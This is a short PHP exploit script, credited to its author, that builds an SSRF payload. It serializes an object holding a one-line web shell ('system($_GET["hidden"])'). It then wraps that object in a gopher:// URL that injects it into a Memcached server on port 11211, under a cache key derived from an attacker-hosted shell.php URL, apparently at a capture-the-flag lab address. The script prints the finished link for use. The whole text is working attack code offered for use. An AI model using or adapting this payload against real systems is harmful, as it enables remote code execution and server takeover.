/* 
* PHP Memcached SSRF payload By *
	* ELVI7MAJOR * * Bendalisoftpro *
*/


<?php

class TemplateHelper
{
	public $file;
	public $data;
}

$temp = new TemplateHelper ;
$temp->file = 'shell.php';
$temp->data = '<?php system($_GET["hidden"]); ?>';
$temph = serialize($temp);

$i= md5("http://10.10.14.22/shell.php");
$ii= "xct_".md5($i.":spc");

$encd= urlencode($temph);
$rep= str_replace("+","%20",$encd);

$payload = "%0d%0aset%20".$ii."%200%20180%20".strlen($temph)."%0d%0a";
$finalpld = "gopher://0:11211/_".$payload.$rep."%0d%0a";

echo "Your SSRF link ready with gopher Protocol"."\n\n" ;
echo $finalpld;
echo "\n\n";

?>
